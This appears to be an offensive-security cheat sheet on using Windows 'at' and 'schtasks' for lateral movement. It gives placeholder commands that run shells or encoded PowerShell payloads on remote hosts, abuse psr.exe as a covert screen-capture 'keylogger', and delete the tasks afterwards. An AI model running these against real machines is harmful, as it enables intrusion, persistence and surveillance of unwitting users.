# Schedule Periodic Tasks

## 01 - at

### 1.1 - Use Cases

```
C:\> net time \\<IP>

C:\> at <HH:mm> /interactive /every:m,t,w,th,f,s,su C:\path\to\shell.exe

C:\> at <HH:mm> powershell.exe -E <base64_payload>

C:\> at \\<IP>
```

## 02 - Schtasks

TODO: Fill this info

### 2.1 - Help Menu

#### 2.1.1 - Create Task

```
/create => create a schedule task
/sc => type of schedule
/st => start time
/tn => task name
/tr => task run
/s => computer IP
/ru => specify the username: { [DOMAIN_name]\<username> | system }
/rp => specify the password
/it => Make it interactive when the user is using his computer
```

#### 2.1.2 - Delete Task

### 2.2 - Usage

```
C:\> schtasks /create /tn "<task_name>" /tr "<commands>" /sc once /st <HH:mm> /s <IP> /ru [DOMAIN]\<username> /rp <password>

C:\> schtasks /create /tn "<task_name>" /tr "<commands>" /sc once /st <HH:mm> /s <IP> /ru system
```

### 2.2 - Use Cases

- Taking screenshots (Living off the Land)

```
C:\> net time \\<IP>

PS C:\> Invoke-Command -ComputerName <IP> -ScriptBlock {Get-Date}

C:\> schtasks /create /tn "keylogger" /tr "C:\Windows\system32\psr.exe /start /gui 0 /output C:\path\to\file.zip" /sc once /st 00:00 /it [/ru <DOMAIN>\<username>] [/rp <password>] /s <target_IP>

C:\> schtasks /run /tn "keylogger" /s <IP>
```

- Create schedule task to stop taking screenshots

```
C:\> schtasks /create /tn "stop_keylogger" /tr "C:\Windows\system32\psr.exe /stop" /sc once /st 00:00 /it [/ru <DOMAIN>\<username>] [/rp <password>] /s <target_IP>

C:\> schtasks /run /tn "stop_keylogger" /s <IP>
```

- Delete schedule tasks

```
C:\> schtasks /delete /f /tn "keylogger" /s <IP>

C:\> schtasks /delete /f /tn "stop_keylogger" /s <IP>

C:\> schtasks /query /tn "keylogger" /fo List /v /s <IP>

C:\> schtasks /query /tn "stop_keylogger" /fo List /v /s <IP>
```

---
## References

- [Schtasks](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks)

- [Lateral Movement Windows and Active Directory](https://riccardoancarani.github.io/2019-10-04-lateral-movement-megaprimer/)